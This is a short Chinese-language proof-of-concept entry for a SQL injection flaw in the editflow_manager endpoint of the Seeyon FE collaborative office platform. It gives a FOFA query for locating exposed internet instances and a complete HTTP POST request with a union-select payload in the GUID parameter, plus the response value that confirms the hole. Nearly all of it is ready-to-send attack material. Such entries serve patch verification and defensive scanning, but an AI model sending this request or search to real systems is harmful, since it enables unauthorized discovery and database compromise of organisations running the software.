## 致远互联FE协作办公平台editflow_manager存在sql注入漏洞

## fofa
```
title="FE协作办公平台" || body="li_plugins_download"
```


## poc
```
POST /sysform/003/editflow_manager.js%70 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Length: 41
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

option=2&GUID=-1'+union+select+111*222--+
```
响应结果中包含24642证明存在漏洞

